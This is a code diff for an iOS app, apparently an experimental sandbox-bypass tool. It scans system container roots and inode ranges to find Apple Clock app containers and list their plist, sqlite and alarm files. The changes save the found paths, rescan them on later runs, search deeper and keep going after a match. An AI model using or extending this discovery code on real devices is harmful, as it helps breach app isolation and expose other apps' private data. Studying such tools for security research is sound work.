@@ -23,7 +23,7 @@ static NSString *Normalize(NSString *p) {
     return [p hasPrefix:@"/var/"]?[@"/private" stringByAppendingString:p]:p;
 }
 static BOOL ClockID(NSString *s) {
-    return [@[@"com.apple.mobiletimer",@"com.apple.mobiletimerd",@"group.com.apple.mobiletimer",@"group.com.apple.mobiletimerd",@"systemgroup.com.apple.mobiletimer",@"systemgroup.com.apple.mobiletimerd"] containsObject:s];
+    return [@[@"com.apple.mobiletimer",@"com.apple.mobiletimerd",@"group.com.apple.mobiletimer",@"group.com.apple.mobiletimerd",@"systemgroup.com.apple.mobiletimer",@"systemgroup.com.apple.mobiletimerd"] containsObject:s.lowercaseString];
 }
 static NSArray *Roots(void) { return @[@"/private/var/mobile/Containers/Data/Application",@"/private/var/mobile/Containers/Data/InternalDaemon",@"/private/var/mobile/Containers/Shared/AppGroup",@"/private/var/containers/Shared/SystemGroup",@"/private/var/containers/Data/System"]; }
 static BOOL ContainerPath(NSString *p) { return [Roots() containsObject:p.stringByDeletingLastPathComponent] && p.lastPathComponent.length>0; }
@@ -47,6 +47,7 @@ typedef const char *(*ObjectString)(void *);
 @property(nonatomic) NSUInteger matches;
 @property(nonatomic) BOOL cacheFailure;
 @property(nonatomic) BOOL scanFinished;
+@property(nonatomic) NSUInteger unidentified;
 #ifdef CLOCK_ACCESS_TESTING
 @property(nonatomic) NSString *testGroupRoot;
 #endif
@@ -184,7 +185,13 @@ done:
     }
 }
 - (void)inspectContainer:(NSString *)path identifier:(NSString *)identifier {
-    self.matches++; [self line:[NSString stringWithFormat:@"CLOCK container: %@\n%@",identifier,path]];
+    self.matches++;
+    NSMutableDictionary *known=[[NSUserDefaults.standardUserDefaults dictionaryForKey:@"clockKnownContainers"] mutableCopy]?:[NSMutableDictionary new];
+    known[path]=identifier;
+    [NSUserDefaults.standardUserDefaults setObject:known forKey:@"clockKnownContainers"];
+    NSDate *scanDeadline=self.deadline;
+    self.deadline=[NSDate dateWithTimeIntervalSinceNow:10];
+    [self line:[NSString stringWithFormat:@"CLOCK container: %@\n%@",identifier,path]];
     NSMutableArray<NSDictionary *> *todo=[NSMutableArray arrayWithObject:@{@"path":path,@"depth":@0}];
     NSUInteger visited=0;
     while(todo.count && visited++<500 && self.deadline.timeIntervalSinceNow>0) {
@@ -196,8 +203,8 @@ done:
         for(NSString *name in names) {
             if([name hasPrefix:@"."])continue;
             NSString *p=[dir stringByAppendingPathComponent:name];struct stat st;
-            if(lstat(p.fileSystemRepresentation,&st)!=0)continue;
-            if(S_ISDIR(st.st_mode) && depth<4 && ![name isEqual:@"Caches"] && ![name isEqual:@"tmp"]) {
+            if(lstat(p.fileSystemRepresentation,&st)!=0){[self line:[NSString stringWithFormat:@"  stat failed: %@ errno=%d",[p substringFromIndex:path.length],errno]];continue;}
+            if(S_ISDIR(st.st_mode) && depth<8 && ![name isEqual:@"Caches"] && ![name isEqual:@"tmp"]) {
                 if(todo.count<500)[todo addObject:@{@"path":p,@"depth":@(depth+1)}];
             } else if(S_ISREG(st.st_mode) && ([@[@"plist",@"sqlite",@"sqlite3",@"db"] containsObject:name.pathExtension.lowercaseString] || [name.lowercaseString containsString:@"alarm"])) {
                 [self line:[NSString stringWithFormat:@"  file: %@ (%lld bytes)",[p substringFromIndex:path.length],st.st_size]];
@@ -207,6 +214,7 @@ done:
         [self release:handle];
     }
     if(todo.count)[self line:@"  Clock listing stopped at the depth/item/time limit; listing is partial"];
+    self.deadline=scanDeadline;
 }
 - (void)candidate:(NSString *)path {
     path=Normalize(path);
@@ -225,6 +233,7 @@ done:
         }
     }
     [self release:handle];
+    if(!identifier.length)self.unidentified++;
     if(ClockID(identifier)) [self inspectContainer:path identifier:identifier];
 }
 // iOS MobileTimer names this SystemGroup directly. Its parent may reject
@@ -292,12 +301,12 @@ done:
         }
     }
     [NSUserDefaults.standardUserDefaults setDouble:ino>limit?2:(double)ino forKey:@"clockProbeCursor"];
-    self.scanFinished=(ino>limit || self.matches>0);
-    [self line:[NSString stringWithFormat:@"Inode discovery: %llu through %llu of %llu. %@",start,ino>start?ino-1:start,limit,ino>limit?@"Full inode range completed; visibility can still be restricted.":(self.matches?@"Clock container found; scan stopped.":@"Partial range saved; the automatic scan will continue.")]];
+    self.scanFinished=(ino>limit);
+    [self line:[NSString stringWithFormat:@"Inode discovery: %llu through %llu of %llu. %@",start,ino>start?ino-1:start,limit,ino>limit?@"Full inode range completed; visibility can still be restricted.":@"Partial range saved; the automatic scan will continue even after finding Clock preferences."]];
 }
 - (NSString *)runPass:(BOOL)firstPass {
     self.report=[NSMutableString new];self.seen=[NSMutableSet new];self.identifiers=[NSMutableDictionary new];
-    self.matches=0;self.scanFinished=NO;
+    self.matches=0;self.unidentified=0;self.scanFinished=NO;
     [self line:@"Clock filesystem experiment (worse_query). No XCTest or Siri invoked.\nAlarm files are read only. No alarm mutation or scheduling is implemented."];
 #if TARGET_OS_SIMULATOR
     [self line:@"Simulator: exploit disabled. A signed phone is required."];self.scanFinished=YES;return self.report;
@@ -307,6 +316,13 @@ done:
     [self line:[NSString stringWithFormat:@"Signed App Group: %@",self.group]];
     self.deadline=[NSDate dateWithTimeIntervalSinceNow:25];
     if(firstPass) {
+        NSDictionary *known=[NSUserDefaults.standardUserDefaults dictionaryForKey:@"clockKnownContainers"];
+        for(NSString *path in known) {
+            if(!ContainerPath(path) || !ClockID(known[path]))continue;
+            [self line:@"Rechecking remembered Clock storage directly."];
+            [self.seen addObject:path];
+            [self inspectContainer:path identifier:known[path]];
+        }
         [self inspectNamedClockGroup];
         [self queryCandidates];
         for(NSString *root in Roots()) {
@@ -320,9 +336,9 @@ done:
     } else {
         [self line:@"Continuing the saved inode scan automatically."];
     }
-    if(self.matches) self.scanFinished=YES;
     if(!self.scanFinished && self.deadline.timeIntervalSinceNow>0 && !self.cacheFailure)[self scanInodes];
     [self line:[NSString stringWithFormat:@"Identified Clock containers: %lu; candidate metadata checked: %lu",(unsigned long)self.matches,(unsigned long)self.seen.count]];
+    [self line:[NSString stringWithFormat:@"Container metadata unreadable/unidentified this pass: %lu. Remembered Clock storage locations: %lu. Finding preferences does not finish discovery.",(unsigned long)self.unidentified,(unsigned long)[[NSUserDefaults.standardUserDefaults dictionaryForKey:@"clockKnownContainers"] count]]];
     if(self.cacheFailure){self.scanFinished=YES;[self line:@"STOP -18: App Group cache recovery failed. Original contents remain at Library/.daybreak-wq-caches.saved. No further queries attempted."];}
     [self line:@"Clock service entitlements, live daemon reload, and locked-screen execution are NOT established by this filesystem test. No upload occurred."];
     return self.report;
